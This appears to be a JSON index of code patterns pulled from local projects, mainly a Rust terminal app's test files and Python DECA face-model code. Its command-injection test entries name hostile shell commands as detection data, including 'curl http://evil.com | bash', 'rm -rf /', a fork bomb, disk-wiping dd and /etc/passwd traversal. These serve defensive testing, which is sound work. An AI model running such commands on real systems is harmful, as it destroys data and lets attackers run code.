          "impl MockPtySession {",
          "impl MockPtyRegistry {"
        ],
        "uses": [
          "use std::sync::{Arc, Mutex, atomic::{AtomicU32, AtomicBool, Ordering}};",
          "use std::collections::HashMap;",
          "use std::thread;",
          "use std::time::Duration;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;"
        ],
        "macros": [
          "Err(format!(\"PTY {} not found\", id))",
          "Err(format!(\"PTY {} not found\", id))",
          "Err(format!(\"PTY {} not found\", id))",
          "Err(format!(\"PTY {} not found\", id))",
          "assert!(result.is_ok());",
          "assert_eq!(info.id, 1);",
          "assert!(info.is_alive);",
          "assert!(result.is_ok());",
          "assert_eq!(info.shell, \"/bin/bash\");",
          "assert_eq!(info.cwd, \"/home/user\");",
          "assert_eq!(pty1.id, 1);",
          "assert_eq!(pty2.id, 2);",
          "assert_eq!(pty3.id, 3);",
          "assert_eq!(info.rows, 24);",
          "assert_eq!(info.cols, 80);",
          "assert_eq!(ids.len(), 100);",
          "assert!(result.is_ok());",
          "assert_eq!(output, b\"test\");",
          "assert!(second_read.is_empty());",
          "assert!(result.is_err());",
          "assert!(result.is_err());",
          "assert!(result.is_ok());",
          "assert!(result.is_ok());",
          "assert_eq!(updated.rows, 40);",
          "assert_eq!(updated.cols, 120);",
          "assert!(result.is_err());",
          "assert!(result.is_err());",
          "assert!(result.is_err());",
          "assert_eq!(final_info.rows, 30);",
          "assert_eq!(final_info.cols, 90);",
          "assert_eq!(registry.count(), 1);",
          "assert!(result.is_ok());",
          "assert_eq!(registry.count(), 0);",
          "assert!(result.is_err());",
          "assert!(result.is_err());",
          "assert!(registry.send_input(info.id, b\"test\").is_err());",
          "assert!(registry.read_output(info.id).is_err());",
          "assert!(registry.resize(info.id, 24, 80).is_err());",
          "assert_eq!(registry.count(), 10);",
          "assert_eq!(cleaned, 10);",
          "assert_eq!(registry.count(), 0);",
          "assert_eq!(created, 5);",
          "assert_eq!(destroyed, 2);",
          "assert_eq!(active, 3);",
          "let _ = r.send_input(id, format!(\"msg_{}_{}\\n\", i, j).as_bytes());",
          "assert_eq!(created, destroyed, \"Created and destroyed counts should match\");",
          "assert_eq!(active, 0, \"No active PTYs should remain\");",
          "assert_eq!(cleaned, 5);",
          "assert_eq!(registry.count(), 5);",
          "assert!(result.is_ok());",
          "assert!(result.is_ok());",
          "assert_eq!(output, binary);",
          "assert_eq!(String::from_utf8_lossy(&output), \"Hello \u4e16\u754c \ud83c\udf89\");",
          "assert!(result.is_ok());",
          "assert_eq!(registry.count(), 0);",
          "assert!(info.is_alive);",
          "assert_eq!(resized.rows, 50);",
          "assert_eq!(resized.cols, 150);",
          "assert!(!output.is_empty());",
          "assert!(registry.get_info(info.id).is_none());",
          "assert!(String::from_utf8_lossy(&out1).contains(\"bash\"));",
          "assert!(String::from_utf8_lossy(&out2).contains(\"zsh\"));"
        ],
        "derives": [
          "#[derive(Debug, Clone)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 72
      },
      {
        "file": "/Users/davidquinton/ReverseLab/SAM/warp_tauri/src-tauri/tests/ai_tools_integration.rs",
        "function_defs": [
          "fn test_glob_files_finds_rust_files() {",
          "fn test_grep_files_finds_pattern() {",
          "fn test_grep_files_with_regex() {",
          "fn test_glob_recursive_pattern() {",
          "fn find_rs_files_recursive(dir: &std::path::Path, files: &mut Vec<String>, limit: usize) {",
          "fn test_ai_tool_execution() {",
          "fn test_no_duplicate_tool_execution() {",
          "fn test_tool_result_hidden_from_ui() {",
          "fn test_tool_execution_error_handling() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::path::PathBuf;",
          "use std::fs;"
        ],
        "macros": [
          "let src_path = PathBuf::from(env!(\"CARGO_MANIFEST_DIR\")).join(\"src\");",
          "assert!(!found_files.is_empty(), \"Should find at least one .rs file\");",
          "assert!(found_files.iter().any(|f| f.contains(\"main.rs\")), \"Should find main.rs\"",
          "assert!(found_files.iter().any(|f| f.contains(\"commands.rs\")), \"Should find comm",
          "println!(\"Found {} Rust files: {:?}\", found_files.len(), found_files);",
          "let src_path = PathBuf::from(env!(\"CARGO_MANIFEST_DIR\")).join(\"src\");",
          "assert!(has_fn_main, \"main.rs should contain 'fn main'\");",
          "println!(\"Successfully found 'fn main' in main.rs\");",
          "let src_path = PathBuf::from(env!(\"CARGO_MANIFEST_DIR\")).join(\"src\");",
          "assert!(!matches.is_empty(), \"Should find public functions in commands.rs\");",
          "println!(\"Found {} public functions in commands.rs\", matches.len());",
          "println!(\"  Line {}: {}\", line_num + 1, line.trim());",
          "let base_path = PathBuf::from(env!(\"CARGO_MANIFEST_DIR\"));",
          "assert!(!files.is_empty(), \"Should find Rust files recursively\");",
          "println!(\"Found {} Rust files recursively\", files.len());",
          "assert!(src_files > 0, \"Should find files in src/\");",
          "assert!(test_files > 0, \"Should find files in tests/\");",
          "println!(\"  {} in src/, {} in tests/\", src_files, test_files);",
          "assert!(true, \"AI tool execution placeholder\");",
          "assert!(true, \"Duplicate prevention placeholder\");",
          "assert!(true, \"Tool result filtering placeholder\");",
          "assert!(true, \"Tool error handling placeholder\");"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Users/davidquinton/ReverseLab/SAM/warp_tauri/src-tauri/tests/phase2_test.rs",
        "function_defs": [
          "fn test_phase2_batch_creation() {",
          "fn test_phase2_policy_engine() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use sam_terminal::conversation::{ConversationState, BatchEntry, BatchStatus};",
          "use serde_json::json;"
        ],
        "macros": [
          "args: json!({\"command\": \"echo test\"}),",
          "assert_eq!(batch.status, BatchStatus::Pending);",
          "assert_eq!(batch.entries.len(), 1);",
          "assert_eq!(batches.len(), 1);",
          "assert_eq!(updated.status, BatchStatus::Approved);",
          "println!(\"\u2705 Phase 2 batch creation test passed\");",
          "println!(\"\u2705 Phase 2 policy engine test passed\");"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Users/davidquinton/ReverseLab/SAM/warp_tauri/src-tauri/tests/command_injection_tests.rs",
        "function_defs": [
          "fn validate_command(command: &str) -> Result<(), String> {",
          "fn sanitize_command(command: &str) -> String {",
          "fn is_dangerous_command(command: &str) -> bool {",
          "fn validate_command_args(args: &[&str]) -> Result<(), String> {",
          "fn extract_base_command(command_line: &str) -> Option<&str> {",
          "fn is_allowed_command(command: &str, allowlist: &HashSet<&str>) -> bool {",
          "fn test_detects_semicolon_injection() {",
          "fn test_detects_pipe_injection() {",
          "fn test_detects_command_substitution_dollar() {",
          "fn test_detects_command_substitution_backtick() {",
          "fn test_detects_double_ampersand() {",
          "fn test_detects_double_pipe() {",
          "fn test_detects_newline_injection() {",
          "fn test_detects_null_byte() {",
          "fn test_detects_variable_expansion() {",
          "fn test_detects_process_substitution() {",
          "fn test_detects_output_redirection_append() {",
          "fn test_safe_command_passes() {",
          "fn test_safe_command_with_quotes() {",
          "fn test_detects_rm_rf_root() {",
          "fn test_detects_rm_rf_home() {",
          "fn test_allows_rm_rf_safe_paths() {",
          "fn test_detects_fork_bomb() {",
          "fn test_detects_dd_to_disk() {",
          "fn test_detects_curl_pipe_bash() {",
          "fn test_detects_chmod_recursive_777() {",
          "fn test_detects_system_commands() {",
          "fn test_detects_kill_all() {",
          "fn test_safe_commands_pass() {",
          "fn test_escapes_semicolon() {",
          "fn test_escapes_ampersand() {",
          "fn test_escapes_pipe() {",
          "fn test_escapes_backtick() {",
          "fn test_escapes_dollar() {",
          "fn test_escapes_parentheses() {",
          "fn test_escapes_redirection() {",
          "fn test_preserves_safe_characters() {",
          "fn test_escapes_multiple_dangerous_chars() {",
          "fn test_detects_deep_path_traversal() {",
          "fn test_detects_etc_access() {",
          "fn test_detects_root_access() {",
          "fn test_detects_tilde_root() {",
          "fn test_detects_null_byte_in_arg() {",
          "fn test_allows_safe_paths() {",
          "fn test_allows_relative_paths() {",
          "fn get_safe_allowlist() -> HashSet<&'static str> {",
          "fn test_allows_allowlisted_command() {",
          "fn test_blocks_non_allowlisted_command() {",
          "fn test_handles_path_qualified_commands() {",
          "fn test_blocks_path_qualified_dangerous() {",
          "fn test_handles_empty_command() {",
          "fn test_detects_unicode_semicolon() {",
          "fn test_detects_homoglyph_attack() {",
          "fn test_detects_bidirectional_text_attack() {",
          "fn test_null_byte_midstring() {",
          "fn test_carriage_return_injection() {",
          "fn test_empty_command() {",
          "fn test_whitespace_only() {",
          "fn test_very_long_command() {",
          "fn test_command_with_many_arguments() {",
          "fn test_quoted_dangerous_chars() {",
          "fn test_escaped_dangerous_chars() {",
          "fn test_heredoc_detection() {",
          "fn test_reverse_shell_python() {",
          "fn test_reverse_shell_bash() {",
          "fn test_credential_theft() {",
          "fn test_environment_exfil() {",
          "fn test_crypto_miner_download() {",
          "fn test_data_exfiltration_curl() {",
          "fn test_persistence_cron() {",
          "fn test_git_hook_injection() {",
          "fn test_npm_script_injection() {",
          "fn validate_and_execute(command: &str, allowlist: &HashSet<&str>) -> Result<(), String> {",
          "fn get_test_allowlist() -> HashSet<&'static str> {",
          "fn test_pipeline_safe_command() {",
          "fn test_pipeline_injection_blocked() {",
          "fn test_pipeline_dangerous_blocked() {",
          "fn test_pipeline_path_traversal_blocked() {",
          "fn test_pipeline_not_allowlisted() {",
          "fn test_pipeline_empty_allowlist_allows_safe() {",
          "fn classify_command(command: &str) -> (bool, bool, u32) {",
          "fn test_classify_ls() {",
          "fn test_classify_rm() {",
          "fn test_classify_rm_rf_root() {",
          "fn test_classify_sudo() {",
          "fn test_classify_git_push() {",
          "fn test_classify_git_force_push() {",
          "fn test_classify_npm_install() {",
          "fn test_classify_cargo_build() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::collections::HashSet;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;"
        ],
        "macros": [
          "return Err(format!(\"Injection pattern detected: {}\", pattern.escape_debug()));",
          "return Err(format!(\"Null byte in argument: {:?}\", arg));",
          "return Err(format!(\"Path traversal attempt: {}\", arg));",
          "return Err(format!(\"Home directory escape attempt: {}\", arg));",
          "assert!(validate_command(malicious).is_err());",
          "assert!(is_dangerous_command(\"curl http://evil.com | bash\"));",
          "assert!(validate_command(malicious).is_err());",
          "assert!(validate_command(malicious).is_err());",
          "assert!(validate_command(malicious).is_err());",
          "assert!(validate_command(malicious).is_err());",
          "assert!(validate_command(malicious).is_err());",
          "assert!(validate_command(malicious).is_err());",
          "assert!(validate_command(malicious).is_err());",
          "assert!(validate_command(malicious).is_err());",
          "assert!(validate_command(malicious).is_err());",
          "assert!(validate_command(safe).is_ok());",
          "assert!(validate_command(safe).is_ok());",
          "assert!(is_dangerous_command(\"rm -rf /\"));",
          "assert!(is_dangerous_command(\"rm -rf /*\"));",
          "assert!(is_dangerous_command(\"sudo rm -rf /\"));",
          "assert!(is_dangerous_command(\"rm -rf ~\"));",
          "assert!(is_dangerous_command(\"rm -rf $HOME\"));",
          "assert!(!is_dangerous_command(\"rm -rf ./node_modules\"));",
          "assert!(!is_dangerous_command(\"rm -rf /tmp/test\"));",
          "assert!(!is_dangerous_command(\"rm -rf target/debug\"));",
          "assert!(is_dangerous_command(\":(){ :|:& };:\"));",
          "assert!(is_dangerous_command(\":(){:|:&};:\"));",
          "assert!(is_dangerous_command(\"dd if=/dev/zero of=/dev/sda\"));",
          "assert!(is_dangerous_command(\"dd if=/dev/random of=/dev/disk0\"));",
          "assert!(is_dangerous_command(\"curl http://evil.com | bash\"));",
          "assert!(is_dangerous_command(\"curl http://evil.com | sh\"));",
          "assert!(is_dangerous_command(\"wget -O- http://evil.com | sh\"));",
          "assert!(is_dangerous_command(\"chmod -R 777 /\"));",
          "assert!(is_dangerous_command(\"shutdown -h now\"));",
          "assert!(is_dangerous_command(\"reboot\"));",
          "assert!(is_dangerous_command(\"halt\"));",
          "assert!(is_dangerous_command(\"init 0\"));",
          "assert!(is_dangerous_command(\"kill -9 -1\"));",
          "assert!(is_dangerous_command(\"pkill -9 .\"));",
          "assert!(!is_dangerous_command(\"ls -la\"));",
          "assert!(!is_dangerous_command(\"cat file.txt\"));",
          "assert!(!is_dangerous_command(\"grep pattern file\"));",
          "assert!(!is_dangerous_command(\"npm install\"));",
          "assert!(!is_dangerous_command(\"cargo build\"));",
          "assert!(sanitized.contains(\"\\\\;\"));",
          "assert!(sanitized.contains(\"\\\\&\\\\&\"));",
          "assert!(sanitized.contains(\"\\\\|\"));",
          "assert!(sanitized.contains(\"\\\\`\"));",
          "assert!(sanitized.contains(\"\\\\$\"));",
          "assert!(sanitized.contains(\"\\\\$\\\\(\"));",
          "assert!(sanitized.contains(\"\\\\>\"));",
          "assert_eq!(sanitized, \"echo hello world\");",
          "assert!(sanitized.contains(\"\\\\;\"));",
          "assert!(sanitized.contains(\"\\\\&\\\\&\"));",
          "assert!(sanitized.contains(\"\\\\|\"));",
          "assert!(validate_command_args(&args).is_err());",
          "assert!(validate_command_args(&args).is_err());",
          "assert!(validate_command_args(&args).is_err());",
          "assert!(validate_command_args(&args).is_err());",
          "assert!(validate_command_args(&args).is_err());",
          "assert!(validate_command_args(&args).is_ok());",
          "assert!(validate_command_args(&args).is_ok());",
          "assert!(is_allowed_command(\"ls -la\", &allowlist));",
          "assert!(is_allowed_command(\"cat file.txt\", &allowlist));",
          "assert!(is_allowed_command(\"grep pattern file\", &allowlist));",
          "assert!(!is_allowed_command(\"rm -rf /\", &allowlist));",
          "assert!(!is_allowed_command(\"wget http://evil.com\", &allowlist));",
          "assert!(!is_allowed_command(\"curl http://evil.com\", &allowlist));",
          "assert!(is_allowed_command(\"/bin/ls -la\", &allowlist));",
          "assert!(is_allowed_command(\"/usr/bin/cat file\", &allowlist));",
          "assert!(!is_allowed_command(\"/bin/rm -rf /\", &allowlist));",
          "assert!(!is_allowed_command(\"\", &allowlist));",
          "assert!(is_dangerous_command(&malicious));",
          "assert!(malicious.contains('\\u{202E}'));",
          "assert!(validate_command(malicious).is_err());",
          "assert!(validate_command(malicious).is_ok() ||",
          "assert!(validate_command(\"\").is_ok());",
          "assert!(!is_dangerous_command(\"\"));",
          "assert!(validate_command(\"   \").is_ok());",
          "assert!(!is_dangerous_command(\"   \"));",
          "assert!(validate_command(&long_cmd).is_ok());",
          "let many_args = (0..1000).map(|i| format!(\"arg{}\", i)).collect::<Vec<_>>().join(",
          "let cmd = format!(\"echo {}\", many_args);",
          "assert!(validate_command(&cmd).is_ok());",
          "assert!(validate_command(heredoc).is_err());  // Contains newline",
          "assert!(attack.contains(\"socket\") && attack.contains(\"subprocess\"));",
          "assert!(validate_command(attack).is_err() || attack.contains(\">&\"));",
          "assert!(attack.contains(\".ssh\"));",
          "assert!(validate_command(attack).is_err());  // Contains &&",
          "assert!(validate_command_args(&args).is_err());",
          "assert!(attack.contains(\"|\"));",
          "assert!(validate_command(attack).is_err());  // Contains &&",
          "assert!(is_dangerous_command(attack));  // curl | bash pattern",
          "assert!(validate_and_execute(\"ls -la src/\", &allowlist).is_ok());",
          "assert!(validate_and_execute(\"ls; rm -rf /\", &allowlist).is_err());",
          "assert!(validate_and_execute(\"rm -rf /\", &allowlist).is_err());",
          "assert!(validate_and_execute(\"cat ../../../../etc/passwd\", &allowlist).is_err())",
          "assert!(validate_and_execute(\"wget http://example.com\", &allowlist).is_err());",
          "assert!(validate_and_execute(\"ls -la\", &allowlist).is_ok());",
          "assert!(allowed);",
          "assert!(!confirm);",
          "assert!(score < 25);",
          "assert!(allowed);",
          "assert!(confirm);",
          "assert!(score >= 50);",
          "assert!(!allowed);",
          "assert_eq!(score, 100);",
          "assert!(allowed);",
          "assert!(confirm);",
          "assert!(score >= 50);",
          "assert!(allowed);",
          "assert!(!confirm);",
          "assert!(allowed);",
          "assert!(confirm);",
          "assert!(allowed);",
          "assert!(confirm);",
          "assert!(allowed);",
          "assert!(confirm);"
        ],
        "derives": [],
        "error_handling": 4
      },
      {
        "file": "/Users/davidquinton/ReverseLab/SAM/warp_tauri/src-tauri/tests/pty_integration.rs",
        "function_defs": [
          "fn test_pty_spawns_successfully() {",
          "fn test_pty_executes_simple_command() {",
          "fn test_pty_handles_exit_codes() {",
          "fn test_multiple_pty_sessions() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::thread::sleep;",
          "use std::time::Duration;"
        ],
        "macros": [
          "assert!(true, \"PTY spawn test placeholder\");",
          "assert!(true, \"PTY command execution placeholder\");",
          "assert!(true, \"PTY exit code handling placeholder\");",
          "assert!(true, \"Multiple PTY sessions placeholder\");"
        ],
        "derives": [],
        "error_handling": 0
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/numpy/testing",
    "name": "testing",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv_diarization/lib/python3.11/site-packages/torchcodec/_core",
    "name": "_core",
    "languages": [
      "C++",
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv_diarization/venv_diarization/lib/python3.11/site-packages/torchcodec/_core",
    "name": "_core",
    "languages": [
      "C++",
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv/lib/python3.11/site-packages/torchcodec/_core",
    "name": "_core",
    "languages": [
      "C++",
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv/lib/python3.11/site-packages/numpy/testing",
    "name": "testing",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/uvicorn",
    "name": "uvicorn",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv_diarization/lib/python3.11/site-packages/markdown_it",
    "name": "markdown_it",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv_diarization/venv_diarization/lib/python3.11/site-packages/markdown_it",
    "name": "markdown_it",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv_verify/lib/python3.11/site-packages/markdown_it",
    "name": "markdown_it",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/markdown_it",
    "name": "markdown_it",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/numpy/array_api",
    "name": "array_api",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/hydra",
    "name": "hydra",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv/lib/python3.11/site-packages/numpy/array_api",
    "name": "array_api",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib",
    "name": "decalib",
    "languages": [
      "Python",
      "C++"
    ],
    "python_patterns": [
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/deca.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, config=None, device='cuda'):",
          "def _setup_renderer(self, model_cfg):",
          "def _create_model(self, model_cfg):",
          "def decompose_code(self, code, num_dict):",
          "def displacement2normal(self, uv_z, coarse_verts, coarse_normals):",
          "def visofp(self, normals):",
          "def encode(self, images, use_detail=True):",
          "def decode(self, codedict, rendering=True, iddict=None, vis_lmk=True, return_vis=True, use_detail=True,",
          "def visualize(self, visdict, size=224, dim=2):",
          "def save_obj(self, filename, opdict):",
          "def run(self, imagepath, iscrop=True):",
          "def model_dict(self):"
        ],
        "class_defs": [
          "class DECA(nn.Module):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "import torchvision",
          "import torch.nn.functional as F",
          "import torch.nn as nn",
          "import numpy as np",
          "from time import time",
          "from skimage.io import imread",
          "import cv2",
          "import pickle",
          "from .utils.renderer import SRenderY, set_rasterizer",
          "from .models.encoders import ResnetEncoder",
          "from .models.FLAME import FLAME, FLAMETex",
          "from .models.decoders import Generator",
          "from .utils import util",
          "from .utils.rotation_converter import batch_euler2axis",
          "from .utils.tensor_cropper import transform_points",
          "from .datasets import datasets",
          "from .utils.config import cfg"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# face mask for rendering details",
          "# displacement correction",
          "# mean texture",
          "# dense mesh template, for save detail mesh",
          "# set up parameters",
          "# encoders",
          "# decoders",
          "# resume model",
          "# exit()",
          "# eval mode",
          "# @torch.no_grad()",
          "# use_detail is for training detail model, need to set coarse model as eval mode",
          "# @torch.no_grad()",
          "## decode",
          "## projection",
          "## rendering",
          "# import ipdb; ipdb.set_trace()",
          "# ops = self.render(verts, trans_verts, albedo, codedict['light'])",
          "## output",
          "## render shape",
          "## extract texture",
          "## TODO: current resolution 256x256, support higher resolution, and add visibility",
          "## TODO: poisson blending should give better-looking results",
          "# save coarse mesh, with texture and normal map",
          "# upsample mesh, save detailed mesh"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/trainer.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, model, config=None, device='cuda:0'):",
          "def configure_optimizers(self):",
          "def load_checkpoint(self):",
          "def training_step(self, batch, batch_nb, training_type='coarse'):",
          "def validation_step(self):",
          "def evaluate(self):",
          "def prepare_data(self):",
          "def fit(self):"
        ],
        "class_defs": [
          "class Trainer(object):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "import torchvision",
          "import torch.nn.functional as F",
          "import torch.nn as nn",
          "from torch.utils.data import DataLoader",
          "import numpy as np",
          "from time import time",
          "from skimage.io import imread",
          "import cv2",
          "import pickle",
          "from loguru import logger",
          "from datetime import datetime",
          "from tqdm import tqdm",
          "from .utils.renderer import SRenderY",
          "from .models.encoders import ResnetEncoder",
          "from .models.FLAME import FLAME, FLAMETex",
          "from .models.decoders import Generator",
          "from .utils import util",
          "from .utils.rotation_converter import batch_euler2axis",
          "from .datasets import datasets",
          "from .utils.config import cfg",
          "from .utils import lossfunc",
          "from .datasets import build_datasets",
          "from torch.utils.tensorboard import SummaryWriter",
          "from .datasets.now import NoWDataset"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# training stage: coarse and detail",
          "# deca model",
          "# initialize loss",
          "# # initialize loss",
          "# resume training, including model weight, opt, steps",
          "# import ipdb; ipdb.set_trace()",
          "# load model weights only",
          "# [B, K, 3, size, size] ==> [BxK, 3, size, size]",
          "#-- encoder",
          "### shape constraints for coarse model",
          "### detail consistency for detail model",
          "# import ipdb; ipdb.set_trace()",
          "## append gt",
          "###--------------- training coarse model",
          "#-- decoder",
          "#------ rendering",
          "# mask",
          "# images",
          "#### ----------------------- Losses",
          "############################# base shape",
          "# import ipdb; ipdb.set_trace()",
          "# reg on jaw pose",
          "###--------------- training detail model",
          "#-- decoder",
          "# FLAME - world space",
          "# world to camera",
          "# camera to image space",
          "#------ rendering",
          "# mask",
          "# images",
          "# render detail",
          "#--- extract texture",
          "# self-occlusion",
          "## combine masks",
          "#### ----------------------- Losses",
          "############################### details",
          "# if self.cfg.loss.old_mrf:",
          "#     if self.cfg.loss.old_mrf_face_mask:",
          "#         masks = masks*mask_face_eye*ops['alpha_images']",
          "#     losses['photo_detail'] = (masks*(predicted_detailed_image - images).abs()).mean()*100",
          "#     losses['photo_detail_mrf'] = self.mrf_loss(masks*predicted_detailed_image, masks*images)*0.1",
          "# else:",
          "#########################################################",
          "# run now validation images",
          "#-- save results for evaluation",
          "# save mesh",
          "# save 7 landmarks for alignment",
          "# import ipdb; ipdb.set_trace()",
          "# print(os.path.join(savefolder, imagename[k], name + '_' + vis_name +'.jpg'))",
          "# visualize results to check",
          "## then please run main.py in https://github.com/soubhiksanyal/now_evaluation, it will take around 30min to get the metric results",
          "# for step, batch in enumerate(tqdm(self.train_dataloader, desc=f\"Epoch: {epoch}/{self.cfg.train.max_epochs}\")):",
          "# import ipdb; ipdb.set_trace()",
          "#"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/aflw2000.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, testpath='/ps/scratch/yfeng/Data/AFLW2000/GT', crop_size=224):",
          "def __len__(self):",
          "def __getitem__(self, index):"
        ],
        "class_defs": [
          "class AFLW2000(Dataset):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "import torchvision.transforms as transforms",
          "import numpy as np",
          "import cv2",
          "import scipy",
          "from skimage.io import imread, imsave",
          "from skimage.transform import estimate_transform, warp, resize, rescale",
          "from glob import glob",
          "from torch.utils.data import Dataset, DataLoader, ConcatDataset",
          "import scipy.io"
        ],
        "comments": [
          "# crop image",
          "# 'tform': tform,",
          "# 'original_image': torch.tensor(image.transpose(2,0,1)).float(),"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/datasets/vox.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, K, image_size, scale, trans_scale = 0, dataname='vox2', n_train=100000, isTemporal=False, isEval=False, isSingle=False):",
          "def __len__(self):",
          "def __getitem__(self, idx):",
          "def crop(self, image, kpt):",
          "def load_mask(self, maskpath, h, w):"
        ],
        "class_defs": [
          "class VoxelDataset(Dataset):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "import torchvision.transforms as transforms",
          "import numpy as np",
          "import cv2",
          "import scipy",
          "from skimage.io import imread, imsave",
          "from skimage.transform import estimate_transform, warp, resize, rescale",
          "from glob import glob",
          "from torch.utils.data import Dataset, DataLoader, ConcatDataset"
        ],
        "comments": [
          "# if key not in self.face_dict.keys():",
          "#     self.face_dict[key] = []",
          "# clean version: filter out images with bad lanmark labels, may lack extreme pose example",
          "# filter face",
          "### crop information",
          "## crop",
          "# normalized kpt",
          "###",
          "# translate center",
          "# crop image",
          "# cropped_image = warp(image, tform.inverse, output_shape=(self.image_size, self.image_size))",
          "# # change kpt accordingly",
          "# cropped_kpt = np.dot(tform.params, np.hstack([kpt, np.ones([kpt.shape[0],1])]).T).T # np.linalg.inv(tform.params)",
          "# print(maskpath)",
          "# atts = ['skin', 'l_brow', 'r_brow', 'l_eye', 'r_eye', 'eye_g', 'l_ear', 'r_ear', 'ear_r',",
          "#     'nose', 'mouth', 'u_lip', 'l_lip', 'neck', 'neck_l', 'cloth', 'hair', 'hat']",
          "# for i in range(1, 16):"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
